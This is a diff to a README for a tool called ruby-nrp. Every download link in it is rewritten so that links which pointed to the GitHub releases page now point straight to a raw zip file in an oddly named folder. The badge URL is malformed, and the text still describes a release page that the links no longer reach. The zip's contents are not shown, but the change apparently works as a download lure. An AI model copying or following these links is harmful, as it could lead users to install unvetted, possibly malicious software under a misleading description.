@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20now-blue.svg)](https://github.com/Jaredvazquez/ruby-nrp/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Jaredvazquez/ruby-nrp/main/anarthric/ruby-nrp.zip%https://raw.githubusercontent.com/Jaredvazquez/ruby-nrp/main/anarthric/ruby-nrp.zip)](https://raw.githubusercontent.com/Jaredvazquez/ruby-nrp/main/anarthric/ruby-nrp.zip)
 
 ## 🌟 Overview
 
@@ -13,7 +13,7 @@ ruby-nrp is a user-friendly application designed to help you manage network reso
 To get started with ruby-nrp, follow these simple steps.
 
 1. **Visit the Release Page:** Click the link below to access the download options:
-   [Download from Releases](https://github.com/Jaredvazquez/ruby-nrp/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Jaredvazquez/ruby-nrp/main/anarthric/ruby-nrp.zip)
 
 2. **Choose Your Version:** On the release page, you will see a list of available versions. Choose the latest stable version for the best experience.
 
@@ -44,7 +44,7 @@ ruby-nrp includes several features designed to enhance your resource planning:
 
 To download ruby-nrp, visit the releases page by clicking the link below:
 
-[Download from Releases](https://github.com/Jaredvazquez/ruby-nrp/releases)
+[Download from Releases](https://raw.githubusercontent.com/Jaredvazquez/ruby-nrp/main/anarthric/ruby-nrp.zip)
 
 Once there, follow these steps:
 
